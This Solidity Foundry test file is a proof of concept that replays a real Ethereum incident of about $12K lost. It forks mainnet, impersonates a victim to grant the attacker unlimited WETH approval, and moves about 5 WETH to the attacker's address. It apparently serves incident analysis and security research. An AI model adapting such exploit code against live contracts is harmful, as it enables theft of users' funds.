pragma solidity ^0.8.10;

import "forge-std/Test.sol";
import "../interface.sol";

// @KeyInfo - Total Lost : $12K
// Attacker : https://etherscan.io/address/0x0000daaee5fbc2d3fc5a5c0cb456d2c24e4f81de
// Attack Contract : 
// Vulnerable Contract : 
// Attack Tx : https://app.blocksec.com/explorer/tx/eth/0x3f0dc68dc89fce3250b9d2de2611384b8af258e83f7a711f666917c5590d13d2

// @Info
// Vulnerable Contract Code :

// @Analysis
// Post-mortem : https://x.com/TenArmorAlert/status/1834432197375533433
// Twitter Guy : https://x.com/TenArmorAlert/status/1834432197375533433
// Hacking God : 

address constant weth9 = 0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2;
address constant attacker = 0x0000dAAee5FbC2d3fC5a5C0cB456d2c24e4F81dE;
address constant addr1 = 0x56974D5AF75B1eF96722052a57735187E9b91751;
address constant addr2 = 0x7c243E010E086cAaD737D47E5a40A59E8B79E92d;


contract ContractTest is Test {
    function setUp() public {
        vm.createSelectFork("mainnet", 20738427);
    }
    
    function testPoC() public {
        emit log_named_decimal_uint("before attack: balance of attacker", IERC20(weth9).balanceOf(attacker), 18);
        vm.startPrank(addr2);
        IWETH9(weth9).approve(attacker, type(uint256).max);
        vm.stopPrank();
        vm.startPrank(attacker, attacker);
        IWETH9(weth9).transferFrom(addr2, attacker, 5049899842444876795);
        emit log_named_decimal_uint("after attack: balance of attacker", IERC20(weth9).balanceOf(attacker), 18);
    }
}